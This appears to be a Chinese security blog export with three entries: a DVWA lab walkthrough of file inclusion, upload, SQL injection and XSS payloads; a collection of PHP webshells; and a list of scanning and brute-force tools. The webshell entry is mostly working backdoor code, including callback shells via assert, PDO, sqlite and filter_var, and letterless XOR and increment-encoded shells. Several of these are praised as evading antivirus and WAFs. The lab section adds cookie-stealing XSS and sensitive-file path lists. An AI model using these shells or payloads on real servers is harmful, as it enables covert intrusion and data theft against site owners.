Inclusion一个文件包含漏洞的基础链接：Web安全实战系列：文件包含漏洞 l3m0n师傅-文件包含漏洞小结 文件包含漏洞常常会导致任意文件读取与任意命令执行。 本章不谈payload，只讲绕过方法。 常见的敏感信息路径： Windows系统 c:\boot.ini // 查看系统版本 c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件 c:\windows\repair\sam // 存储Windows系统初次安装的密码 c:\ProgramFiles\mysql\my.ini // MySQL配置 c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码 c:\windows\php.ini // php 配置信息 Linux/Unix系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 Low附上简短的源码… 123456&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; payload： kali下../../../../../../../../../../etc/password Windows下c:\\windows\win.iniWindows下是找到网站根目录下配置的php.ini文件 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 Medium12345678910&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// str_replace对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。$file = str_replace( array( "http://", "https://" ), "", $file );$file = str_replace( array( "../", "..\"" ), "", $file );?&gt; str_replace 函数直接双写就可以绕过 同时可以采用绝对链接，str_replace就替换不了 High12345678910111213&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validationif( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) &#123; // This isn't the page we want! echo "ERROR: File not found!"; exit;&#125;?&gt; 对提交参数进行检查，只允许 include.php 以及 file 开头的文件被包含，只能包含本地file 开头的文件或配合文件上传漏洞组合进行利用 Impossible12345678910111213&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != "include.php" &amp;&amp; $file != "file1.php" &amp;&amp; $file != "file2.php" &amp;&amp; $file != "file3.php" ) &#123; // This isn't the page we want! echo "ERROR: File not found!"; exit;&#125;?&gt; 文件只能是这三种，全部罗列出来了… 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 使用白名单列表限制被包含文件 关闭远程文件包含功能 避免 web 服务器启动用户权限过高 File File UploadLow12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125;&#125;?&gt; 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知 之后直接上传带一句话木马的php文件然后用菜刀连接就ok Medium burpsuite直接抓包修改，可以绕过文件的类型的限制，而且本身只上传一句话木马，大小不会被过滤的内容所限制 组合拳，文件包含加文件上传。用菜刀连接的时候，一开始传递了参数，但是菜刀连接不上，因为它把上传的木马当做图片进行解析，然后返回了值。我们用文件包含获取相关权限就ok 截断绕过规则，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。 High1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错 采用%00截断，还有系统的copy命令，将图片和脚本融合在一起… ImpossibleImpossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 设置项目目录权限：可写目录不执行，执行目录不可写 使用白名单机制对文件类型(mine-type)和文件后缀进行限制 对上传文件大小进行限制 文件存储到服务器时文件名称随机化，禁止使用用户上传指定的文件名称 针对图片文件使用压缩或重设图片像素大小 上传文件存放在独立服务器使用 SQL Injection由于学习sql有一段时间了，所以这章略写 Low字符型注入，直接id=1&#39; or 1=1#闭合即可 Medium整型注入，由于只能有复选框，所以直接burpsuite抓包，再进行修改 id=1 or 1=1即可 High直接注入，#号注释掉后面的语句即可 Impossible修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 使用预处理方式将数据和操作分离（在 SQL 中使用?占位数据） 对数据严格进行类型和格式检查 使用安全函数对数据进行转义 避免 web 服务器启动和数据库操作用户权限过高 SQL Injection (Blind)详版请见：DVWA-1.9全级别教程之SQL Injection(Blind) Low盲注没有回显，利用burpsuite的重放模块来攻击 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Get input $id = $_GET[ 'id' ]; // Check database $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user $html .= '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user $html .= '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125;?&gt; GET了id之后直接拼到查询语句中。 payload：1 or 1=11 and 1=21&#39; or &#39;1&#39;=&#39;11&#39; and &#39;1&#39;=&#39;2 如何使用burpsuite： 使用sqlmap ## Medium ## High ## Impossible Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 ## 修复建议 转载自红日安全《DVWA 漏洞测试平台分析》： 使用预处理方式将数据和操作分离（在 SQL 中使用?占位数据） 对数据严格进行类型和格式检查（url，post data，cookie 等用户可以控制的数据） 使用安全函数对数据进行转义 避免 web 服务器启动和数据库操作用户权限过高 XSS(DOM)LOW我的分析（成功思路）：一个复选框可以选很多语言，且URL直接可以控制参数 观察源码，没有对输入的参数过滤的东西 123&lt;?php #No protections, anything goes?&gt; 直接改变浏览器传入的参数localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt; Medium我的分析（失败）看一波源码 12345678910111213141516&lt;?php /*array_key_exists（）检查某个数组中是否存在指定的键名*检测"default"是否在GET这个变量中和GET传入的参数值不为空*/ if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; $default = $_GET['default']; /*stripos()函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）*/ # Do not allow script tags if (stripos ($default, "&lt;script") !== false) &#123; header ("location: ?default=English"); exit; &#125; &#125; ?&gt; 个人最开始认为这个源码的着重点在 stripos上面，检测了&lt;script这个东西，而且不区分大小写，检测到了就让default=English 大佬的分析 方法一可以看到，medium级别的代码先检查了default参数是否为空如果不为空则将default等于获取到的default值。这里还使用了stripos 用于检测default值中是否有 &lt;script，如果有的话，则将 default=English 。 很明显，这里过滤了 &lt;script (不区分大小写)，那么我们可以使用&lt;img src=1 onerror=(&#39;hack&#39;)&gt;onerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件 查看网页源代码 发现要独立出&lt;img&gt;标签才能弹窗，需要闭合前面的&lt;option&gt;和&lt;select&gt;所以构造语句 ?default=&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;1&apos;)&gt; /* &gt;是用来闭合前面的 &lt;option * &lt;/option&gt;闭合前面的&lt;option&gt; * &lt;/select&gt;闭合前面的&lt;select&gt; * 这样才能使&lt;img&gt;标签逃离出来 */** 方法二** url中有一个字符为 #，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为 注意#号的位置?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; High我的分析（失败）先看一波后端源码，发现进行switch语句，直接列出了所有选项，不知道怎么绕过… 1234567891011121314151617181920212223&lt;?php// Is there any input?/*检测default这个参数是否被设置和是否为空*不为空且被设置进入switch语句*/if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; //下面直接列出了所有的情况 # White list the allowable languages switch ($_GET['default']) &#123; case "French": case "English": case "German": case "Spanish": # ok break; default: header ("location: ?default=English"); exit; &#125;&#125; ?&gt; 大佬的分析 其实同Medium的方法二一样，url中有一个字符为 #，该字符后的数据不会发送到服务器端，从而绕过服务端过滤构造语句http://localhost/DVWA/vulnerabilities/xss_d/?#default=English&lt;script&gt;alert(/xss/)&lt;/script&gt; Impossible分析一波后端源码 12345&lt;?php # Don't need to do anything, protction handled on the client side ?&gt; 好吧没什么可以分析的… 我们查看网页源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 禁用 js 读取 cookie(设置 cookie 为 httponly) 在页面输出数据时对&lt;、&gt;、&amp;、 &#39;、&quot;、/等字符进行 html 实体转义 对输入数据中&lt;、&gt;、&amp;、 &#39;、&quot;进行严格检查 XSS(Reflected)Low我的分析（成功思路）查看后端源代码 Low级别还是没进行参数过滤，存在反射型xss漏洞 12345678910111213&lt;?php header ("X-XSS-Protection: 0"); // Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user //传入参数未经过滤，直接输出 $html .= '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125; ?&gt; 构造语句,成功弹窗&lt;script&gt;alert(/xss/)&lt;/script&gt; 大佬的分析略…补充一波payload &lt;script&gt;alert(/xss/)&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt; &lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt; Medium我的分析（成功思路）源码中发现· str_replace·函数，它只删除一次标签，采用双写绕过 1234567891011121314&lt;?php header ("X-XSS-Protection: 0"); // Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125; ?&gt; 大佬的分析补充一波payload双写绕过检测的标签&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 大小写混写绕过检测的标签&lt;sCrIpt&gt;alert(document.cookie)&lt;/scRipT&gt; 以下两种由于没有&lt;script&gt;标签，所以检测不到，可以直接使用&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt; &lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt; High我的分析（成功思路）查看源码发现使用了正则表达式来过滤掉s c r i p t 这几个字母，相当于删去了&lt;script&gt;这个标签 1234567891011121314&lt;?php header ("X-XSS-Protection: 0"); // Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125; ?&gt; 我看了之后想到了另外两个payload&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt; &lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt; Impossible直接实体化了输入的东西，禁用掉了xss 123456789101112131415161718&lt;?php // Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input，直接实体化了html $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125; // Generate Anti-CSRF tokengenerateSessionToken(); ?&gt; 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 禁用 js 读取 cookie(设置 cookie 为 httponly) 在页面输出数据时对&lt;、&gt;、&amp;、 &#39;、&quot;、/等字符进行 html 实体转义 对输入数据中&lt;、&gt;、&amp;、 &#39;、&quot;进行严格检查 XSS(Stored)全等级这个同反射型xss大致相同。需要注意的是多加了几个函数。而且需要看后端源码来看哪里存在注入点。 而且存储型相比于反射型是，只要访问该页面的用户都会触发xss。 修复建议转载自红日安全《DVWA 漏洞测试平台分析》： 禁用 js 读取 cookie(设置 cookie 为 httponly) 在页面输出数据时对&lt;、&gt;、&amp;、 &#39;、&quot;、/等字符进行 html 实体转义 对输入数据中&lt;、&gt;、&amp;、 &#39;、&quot;进行严格检查]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webshell一把梭]]></title>
    <url>%2F2019%2F06%2F09%2FWebshell%E4%B8%80%E6%8A%8A%E6%A2%AD%2F</url>
    <content type="text"><![CDATA[一些Webshell… 各类免杀webshellPHPphithon圈子里面的https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html 利用PDO::FETCH_FUNC特性留后门 翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。适用于：(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)。 123456&lt;?phpif(($db = @new PDO('sqlite::memory:')) &amp;&amp; ($sql = strrev('TSOP_')) &amp;&amp; ($sql = $$sql)) &#123; $stmt = @$db-&gt;query("SELECT '&#123;$sql[b4dboy]&#125;'"); $result = @$stmt-&gt;fetchAll(PDO::FETCH_FUNC, str_rot13('nffreg'));&#125;?&gt; - **数组操作造成的单参数回调后门** 12345&lt;?php$e = $_REQUEST['e'];$arr = array('test', $_REQUEST['pass']);uasort($arr, base64_decode($e));?&gt; - **二参数回调函数** 123456789101112131415161718192021222324252627同样的道理，这个也是功能类似：&lt;?php$e = $_REQUEST['e'];$arr = array('test' =&gt; 1, $_REQUEST['pass'] =&gt; 2);uksort($arr, $e);再给出这两个函数，面向对象的方法：&lt;?php// way 0$arr = new ArrayObject(array('test', $_REQUEST['pass']));$arr-&gt;uasort('assert');// way 1$arr = new ArrayObject(array('test' =&gt; 1, $_REQUEST['pass'] =&gt; 2));$arr-&gt;uksort('assert');再来两个类似的回调后门：&lt;?php$e = $_REQUEST['e'];$arr = array(1);array_reduce($arr, $e, $_POST['pass']);&lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass']);$arr2 = array(1);array_udiff($arr, $arr2, $e); 三参数回调函数 123456789101112131415&lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);array_walk_recursive($arr, $e, '');不截图了。看了以上几个回调后门，发现preg_replace确实好用。但显然很多WAF和顿顿狗狗的早就盯上这个函数了。其实php里不止这个函数可以执行eval的功能，还有几个类似的：&lt;?phpmb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');另一个：&lt;?phpecho preg_filter('|.*|e', $_REQUEST['pass'], '');这两个一句话都是不杀的： 无回显回调后门 1234&lt;?phpob_start('assert');echo $_REQUEST['pass'];ob_end_flush(); 单参数后门终极奥义 123456789101112131415161718&lt;?php$e = $_REQUEST['e'];register_shutdown_function($e, $_REQUEST['pass']);再来一个：&lt;?php$e = $_REQUEST['e'];declare(ticks=1);register_tick_function ($e, $_REQUEST['pass']);再来两个：&lt;?phpfilter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' =&gt; 'assert'));filter_var_array(array('test' =&gt; $_REQUEST['pass']), array('test' =&gt; array('filter' =&gt; FILTER_CALLBACK, 'options' =&gt; 'assert')));这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。这几个单参数回调后门非常隐蔽，基本没特征，用起来很6. 数据库操作与第三方库中的回调后门 123456789101112131415161718192021222324252627282930313233343536我们可以注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert。所以这个后门我这样构造：&lt;?php$e = $_REQUEST['e'];$db = new PDO('sqlite:sqlite.db3');$db-&gt;sqliteCreateFunction('myfunc', $e, 1);$sth = $db-&gt;prepare("SELECT myfunc(:exec)");$sth-&gt;execute(array(':exec' =&gt; $_REQUEST['pass']));上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：&lt;?php$e = $_REQUEST['e'];$db = new SQLite3('sqlite.db3');$db-&gt;createFunction('myfunc', $e);$stmt = $db-&gt;prepare("SELECT myfunc(?)");$stmt-&gt;bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);$stmt-&gt;execute();前提是php5.3以上。如果是php5.3以下的，使用sqlite_*函数，自己研究我不列出了。这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。比如php_yaml：&lt;?php$str = urlencode($_REQUEST['pass']);$yaml = &lt;&lt;&lt;EODgreeting: !&#123;$str&#125; "|.+|e"EOD;$parsed = yaml_parse($yaml, 0, $cnt, array("!&#123;$_REQUEST['pass']&#125;" =&gt; 'preg_replace'));还有php_memcached：&lt;?php$mem = new Memcache();$re = $mem-&gt;addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));$mem-&gt;connect($_REQUEST['pass'], 11211, 0); 其他参数型回调后门 12345678910111213141516171819202122232425262728上面说了，回调函数格式为1、2、3参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？举个例子，php5.5以后建议用preg_replace_callback代替preg_replace的/e模式来处理正则执行替换，那么其实preg_replace_callback也是可以构造回调后门的。preg_replace_callback的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。所以我们需要去“构造”一个满足条件的回调函数。怎么构造？使用create_function：&lt;?phppreg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。这也是一个不杀不报稳定执行的回调后门，但因为有create_function这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。类似的，这个也同样：&lt;?phpmb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);再来一个利用CallbackFilterIterator方法的回调后门：&lt;?php$iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));foreach ($iterator as $item) &#123; echo $item;&#125;这里也是借用了create_function来创建回调函数。但有些同学就问了，这里创建的回调函数只有一个参数呀？实际上这里如果传入assert，是会报错的，具体原因自己分析。 无视任何waf 这个代码怎么拿到webshell？ 123456&lt;?php$param = $_REQUEST['param'];if(strlen($param)&lt;17 &amp;&amp; stripos($param,'eval') === false &amp;&amp; stripos($param,'assert') === false) &#123; eval($param);&#125;?&gt; Answer 12345678910POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET); 无字母数字webshell 来源phithon代码圈 一些不包含数字和字母的webshell如何利用以下代码？ 1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; php5和7的差异。 php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 位运算里的“异或”这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 123456&lt;?php//url编码表示$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]); 位运算里的“取反”方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s： 1234567891011&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]); 这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。 递增／递减运算符 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);]]></content>
      <categories>
        <category>Other</category>
      </categories>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具一把梭]]></title>
    <url>%2F2019%2F06%2F09%2F%E5%B7%A5%E5%85%B7%E4%B8%80%E6%8A%8A%E6%A2%AD%2F</url>
    <content type="text"><![CDATA[一些工具的收集 常用工具子域名枚举扫描器或爆破工具 https://github.com/lijiejie/subDomainsBrute子域名枚举与地图标记https://github.com/le4f/dnsmaperwindows内网扫描https://github.com/robertdavidgraham/masscan/Go语言开发的子域名枚举工具https://github.com/michenriksen/aquatone快速子域枚举工具https://github.com/aboul3la/Sublist3r 数据库类漏洞扫描器或爆破工具 一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具https://github.com/0xbug/SQLiScanner 一款针对mongoDB的攻击工具https://github.com/youngyangyang04/NoSQLAttack 攻击SQLSERVER的Powershell脚本框架https://github.com/NetSPI/PowerUpSQL 弱口令/弱用户名扫描器或爆破工具 一个简单的HTTP暴力破解、撞库攻击脚本https://github.com/lijiejie/htpwdScan 支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器https://github.com/s0md3v/Blazy 对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本https://github.com/MooseDojo/myBFF 自动化信息搜集及渗透测试工具，比较适用于IoT扫描https://github.com/zdresearch/OWASP-Nettacker Telnet服务密码撞库https://github.com/scu-igroup/telnet-scanner 企业资产管理或信息泄露搜集工具 企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hostshttps://github.com/laramies/theHarvester 网络资产识别引擎，漏洞检测引擎https://github.com/ysrc/xunfeng .svn文件夹泄漏利用工具https://github.com/shengqi158/svnhack GitHub敏感信息扫描工具,包括检测commit等https://github.com/dxa4481/truffleHog 企业资产、敏感信息GitHub泄露监控系统https://github.com/0xbug/Hawkeye .git文件夹泄漏利用工具https://github.com/lijiejie/GitHack 自动化对指定域名进行Google hacking搜索并收集信息https://github.com/1N3/Goohak Web站点信息搜集工具，包括邮箱、电话等信息https://github.com/1N3/BlackWidow 可以提取网址，电子邮件，文件，网站帐户等的高速爬虫https://github.com/s0md3v/Photon webshell检测或木马分析工具 测试效率高达99%的webshell检测工具https://github.com/emposha/PHP-Shell-Detector/ 内网渗透或扫描工具 自动化利用XSS入侵内网https://github.com/BlackHole1/WebRtcXSS 调用 Windows API 枚举用户登录信息https://github.com/fdiskyou/hunter 中间件扫描器或指纹识别工具 目标端口扫描+系统服务指纹识别https://github.com/ring04h/wyportmap WAF产品指纹识别https://github.com/EnableSecurity/wafw00f 动态多线程敏感信息泄露检测工具https://github.com/ring04h/weakfilescan web路径收集与扫描https://github.com/maurosoria/dirsearch 尝试找出cdn背后的真实iphttps://github.com/3xp10it/xcdn 基于Bing搜索引擎的C段/旁站查询，多线程，支持APIhttps://github.com/Xyntax/BingC 多线程WEB目录爆破工具https://github.com/Xyntax/DirBrute CDN识别、检测https://github.com/Nitr4x/whichCDN 服务器ssh配置信息扫描https://github.com/mozilla/ssh_scan 类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议https://github.com/chichou/grab.js 敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描https://github.com/Mosuan/FileScan Web应用fuzz工具、框架，同时可用于web路径/服务扫描https://github.com/xmendez/wfuzz (Web应用fuzz工具、框架，同时可用于web路径/服务扫描https://github.com/dzonerzy/goWAPT 通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器https://github.com/fnk0c/cangibrina 通过扫描全网获得真实IP的自动化程序https://github.com/boy-hack/w8fuckcdn 数据库文件、私钥等敏感文件泄露扫描https://github.com/MetaChar/pyHAWK 高级持续性威胁(APT)相关工具 一款APT入侵痕迹扫描器https://github.com/Neo23x0/Loki Scanners Box项目简介Scanners Box (简称 - scanbox) 是一个集合github平台上的安全行业从业者自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器，同时该仓库只收录各位安全行业从业者自己编写的一般性开源扫描器，类似awvs、nmap、w3af等知名扫描工具不收录。 子域名枚举扫描器或爆破工具 https://github.com/lijiejie/subDomainsBrute (lijiejie开发的一款使用广泛的子域名爆破枚举工具) https://github.com/ring04h/wydomain (猪猪侠开发的一款域名收集全面、精准的子域名枚举工具) https://github.com/le4f/dnsmaper (子域名枚举爆破工具以及地图位置标记) 